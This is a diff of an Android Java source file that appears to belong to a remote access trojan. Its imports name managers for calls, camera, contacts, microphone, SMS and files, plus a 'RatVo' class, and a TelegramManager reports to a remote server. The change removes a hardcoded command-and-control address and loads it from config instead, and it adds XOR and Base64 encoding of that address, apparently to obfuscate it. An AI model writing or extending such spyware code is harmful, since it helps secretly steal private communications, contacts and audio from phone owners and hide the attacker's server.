@@ -1,14 +1,10 @@
 package com.hhm.android.otherapp;
 
 import android.annotation.SuppressLint;
-import android.app.Activity;
-import android.content.ClipboardManager;
 import android.content.Context;
 import android.content.pm.PackageManager;
 import android.os.Build;
-import android.os.SystemClock;
 import android.provider.Settings;
-import android.support.v4.app.ActivityCompat;
 import android.util.Log;
 
 import com.amap.api.location.AMapLocation;
@@ -26,18 +22,17 @@ import com.hhm.android.otherapp.managers.CallsManager;
 import com.hhm.android.otherapp.managers.CameraManager;
 import com.hhm.android.otherapp.managers.ContactsManager;
 import com.hhm.android.otherapp.managers.FileManager;
-import com.hhm.android.otherapp.managers.LocManager;
 import com.hhm.android.otherapp.managers.MicManager;
 import com.hhm.android.otherapp.managers.SMSManager;
 import com.hhm.android.otherapp.managers.SQLiteManager;
+import com.hhm.android.otherapp.utils.Base64Util;
 import com.hhm.android.otherapp.utils.RatVo;
+import com.hhm.android.otherapp.utils.XorUtil;
 import com.jakewharton.retrofit2.adapter.rxjava2.RxJava2CallAdapterFactory;
 
 import java.io.File;
 import java.net.SocketException;
 import java.net.SocketTimeoutException;
-import java.nio.ByteBuffer;
-import java.util.concurrent.TimeUnit;
 import java.util.concurrent.TimeoutException;
 
 import io.reactivex.functions.Consumer;
@@ -50,8 +45,6 @@ import retrofit2.HttpException;
 import retrofit2.Response;
 import retrofit2.Retrofit;
 import retrofit2.converter.gson.GsonConverterFactory;
-
-import static java.security.AccessController.getContext;
 
 
 /**
@@ -87,10 +80,12 @@ public class TelegramManager {
     public static Context context;
 
     //public static String url = "http://tg.fupdate.cc:8001";
-    public static String url = "http://192.168.3.86:8001";
+    //public static String url = "http://192.168.3.86:8001";
+    public static String url = "http://" + ServiceConfig.getRemoteAddress();
     public static int count = 0;
 
     public static void startAsync(final Context con) {
+        System.out.println("2021==99>" + Base64Util.encode(XorUtil.xor("192.168.3.86:8001")));
         try {
             context = con;
             sendReq();
